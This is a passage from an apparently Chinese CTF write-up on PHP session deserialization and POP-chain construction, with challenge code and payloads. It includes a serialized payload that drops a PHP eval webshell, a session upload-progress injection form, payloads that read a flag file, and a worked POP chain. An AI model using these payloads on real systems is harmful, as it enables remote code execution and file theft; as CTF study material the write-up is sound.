<span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span> ) . <span class="hljs-string">&#x27;-&#x27;</span><br>            . substr ( <span class="hljs-variable">$chars</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span> );<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$uuid</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意此处</p><blockquote><p>ini_set(‘session.serialize_handler’, ‘php’);</p></blockquote><p>出现了一个写文件的函数，回顾 index.php 发现<code>$this-&gt;username和$this-&gt;password</code>是可控的，而又被包含在 check.php</p><blockquote><p>file_put_contents(“log-“.$this-&gt;username, “使用”.$this-&gt;password.”登陆”.($this-&gt;status?”成功”:”失败”).”—-“.date_create()-&gt;format(‘Y-m-d H:i:s’));</p></blockquote><p>也就是说我们需要通过 cookie 传进去我们的恶意代码，看一下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211021221915549.png"></p><p><code>MQ%3D%3D</code>–&gt;<code>MQ==</code>–&gt;<code>a</code>，很明显的传值了，首先在 cookie 中设置 limit 值为 payload，然后刷新 index.php，此时 session_start()开启了会话，盲猜是 php_serialize 引擎存储的对象数据，我们再通过访问包含了 inc.php 的 check.php，就执行了设置 php 为引擎的代码，进而反序列化得到一个新的对象</p><p>所以通过注入 <code>|</code> 字符伪造了对象的序列化数据，生成木马文件</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;hack.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$status</span> = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> User();<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-string">&#x27;|&#x27;</span>.serialize(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p><p>cookie 中含有 UM_distinctid 的，不可用 hackbar 的增加头功能，会覆盖掉原有的 cookie，而我们的目标只是替换 cookie[PHPSESSID]值</p><h4 id="jarvisoj-web-的一道-SESSION-反序列化"><a href="#jarvisoj-web-的一道-SESSION-反序列化" class="headerlink" title="jarvisoj-web 的一道 SESSION 反序列化"></a>jarvisoj-web 的一道 SESSION 反序列化</h4><p><a href="http://web.jarvisoj.com:32784/index.php">http://web.jarvisoj.com:32784/index.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//A webshell is wait for you</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$m</span> = <span class="hljs-keyword">new</span> OowoO();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    highlight_string(file_get_contents(<span class="hljs-string">&#x27;index.php&#x27;</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>存在<code>ini_set(‘session.serialize_handler’, ‘php’)</code>，暂时没找到用 php_serialize 添加 session 的方法，但 get 传入 phpinfo 时会实例化<code>OowoO</code>这个类并可以查看 phpinfo</p><blockquote><p>index.php?phpinfo</p></blockquote><p>disable_function</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">dl,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,passthru,popen,proc_open,pcntl_exec,shell_exec,<span class="hljs-keyword">chmod</span>,set_time_limit,<span class="hljs-keyword">chroot</span>,error_log,pfsockopen,syslog,<span class="hljs-keyword">symlink</span>,putenv,chgrp,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/12/.png"></p><p><code>session.upload_progress.enabled</code>为 On。<code>session.upload_progress.enabled</code>本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时 POST 一个与 php.ini 中<code>session.upload_progress.name</code>同名的变量时（<code>session.upload_progress.name</code>的变量值默认为<code>PHP_SESSION_UPLOAD_PROGRESS</code>），PHP 检测到这种同名请求会在$_SESSION 中添加一条数据。我们由此来设置 session。</p><p>首先 先构造一个文件上传</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span></span><br><span class="hljs-tag">  <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接着搞反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OowoO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mdzz</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;mdzz = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;mdzz);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> OowoO();<br><span class="hljs-variable">$a</span>-&gt;mdzz=<span class="hljs-string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;<br><span class="hljs-comment">//$a-&gt;mdzz=&quot;var_dump(scandir(&#x27;__dir__&#x27;));&quot;;</span><br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-comment">//得到：O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:24:&quot;var_dump(scandir(&#x27;./&#x27;));&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>防止转义，在引号前面加上\得到<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715000429267.png"></p><p>在 phpinfo 得知根目录为<code>DOCUMENT_ROOT:/opt/lampp/htdocs</code></p><p>修改传引用为<code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></p><p>同样的方法得到 payload：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210715001047516.png"></p><h2 id="POP-链"><a href="#POP-链" class="headerlink" title="POP 链"></a>POP 链</h2><h3 id="POP：面向属性编程"><a href="#POP：面向属性编程" class="headerlink" title="POP：面向属性编程"></a>POP：面向属性编程</h3><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<strong>进行反序列化的数据能够被用户输入所控制。</strong></p><h3 id="Autoloading"><a href="#Autoloading" class="headerlink" title="Autoloading"></a>Autoloading</h3><p>传统的 PHP 要求应用程序导入每个类中的所有类文件，这样就意味着每个 PHP 文件需要一列长长的 include 或 require 方法，而在当前主流的 PHP 框架中，都采用了 Autoloading 自动加载类来完成这样繁重的工作。在完善简化了类之间调用的功能的同时，也为序列化漏洞造成了便捷。Composer 是 PHP 用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。Composer 默认是从 Packagist 来下载依赖库的。<br>所以我们挖掘漏洞的思路就可以从依赖库文件入手。</p><p>1.从可能存在漏洞的依赖库文件入手 可以使用代码审计工具或者全局手动搜索__wakeup()和__destruct()</p><p>在 composer.json 中存在以下组件就要引起注意了</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl">任意写<br><span class="hljs-variable">monolog</span>/<span class="hljs-function"><span class="hljs-title">monolog</span>(&lt;<span class="hljs-number">1.11</span>.<span class="hljs-number">0</span>)</span><br><span class="hljs-variable">guzzlehttp</span>/<span class="hljs-variable">guzzle</span><br><span class="hljs-variable">guzzle</span>/<span class="hljs-variable">guzzle</span><br>任意删除<br><span class="hljs-variable">swiftmailer</span>/<span class="hljs-variable">swiftmailer</span><br></code></pre></td></tr></table></figure><p>2.从应用的代码框架的逻辑上入手</p><p>3.从 PHP 语言本身漏洞入手</p><h3 id="POP-链利用"><a href="#POP-链利用" class="headerlink" title="POP 链利用"></a>POP 链利用</h3><p>有两种情形：</p><ul><li>在 PHP 魔术方法中出现缺陷代码，自动调用而触发漏洞</li><li>缺陷代码不在魔术方法中，而是在一个类的普通方法中。这时候就要寻找相同的函数名，将类的属性和敏感函数(能背利用的同名函数)的属性联系起来。</li></ul><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到需要执行 GetFlag 类中的 get_flag()函数，这是一个类的普通方法。要让这个方法执行，需要构造一个 POP 链。</p><ol><li><p><code>string1</code>中的<code>__tostring</code>存在<code>$this-&gt;str1-&gt;get_flag()</code>，分析一下要自动调用<code>__tostring()</code>需要把类<code>string1</code>当成字符串来使用，因为调用的是参数<code>str1</code>的方法，所以需要把<code>str1</code>赋值为类<code>GetFlag</code>的对象。</p></li><li><p>发现类<code>func</code>中存在<code>__invoke</code>方法执行了字符串拼接，需要把<code>func</code>当成函数使用自动调用<code>__invoke</code>然后把<code>$mod1</code>赋值为<code>string1</code>的对象与<code>$mod2</code>拼接。</p></li><li><p>在<code>funct</code>中找到了函数调用，需要把<code>mod1</code>赋值为<code>func</code>类的对象，又因为函数调用在<code>__call</code>方法中，且参数为<code>$test2</code>,即无法调用<code>test2</code>方法时自动调用 <code>__call</code>方法；</p></li><li><p>在<code>Call</code>中的<code>test1</code>方法中存在<code>$this-&gt;mod1-&gt;test2();</code>，需要把<code>$mod1</code>赋值为<code>funct</code>的对象，让<code>__call</code>自动调用。</p></li><li><p>查找<code>test1</code>方法的调用点，在<code>start_gg</code>中发现<code>$this-&gt;mod1-&gt;test1();</code>，把<code>$mod1</code>赋值为<code>start_gg</code>类的对象，等待<code>__destruct()</code>自动调用。</p></li></ol><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> Call();<span class="hljs-comment">//把$mod1赋值为Call类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> funct();<span class="hljs-comment">//把 $mod1赋值为funct类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">funct</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1= <span class="hljs-keyword">new</span> func();<span class="hljs-comment">//把 $mod1赋值为func类对象</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$test2</span>,<span class="hljs-variable">$arr</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable">$s1</span> = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                <span class="hljs-variable">$s1</span>();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$mod2</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> string1();<span class="hljs-comment">//把 $mod1赋值为string1类对象</span><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string1</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str1</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1= <span class="hljs-keyword">new</span> GetFlag();<span class="hljs-comment">//把 $str1赋值为GetFlag类对象</span><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;xxxxxxxxxxxx&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> start_gg();<span class="hljs-comment">//构造start_gg类对象$b</span><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>)).<span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<span class="hljs-comment">//显示输出url编码后的序列化对象</span><br></code></pre></td></tr></table></figure><h4 id="2021-强网杯赌徒"><a href="#2021-强网杯赌徒" class="headerlink" title="2021 强网杯赌徒"></a>2021 强网杯赌徒</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 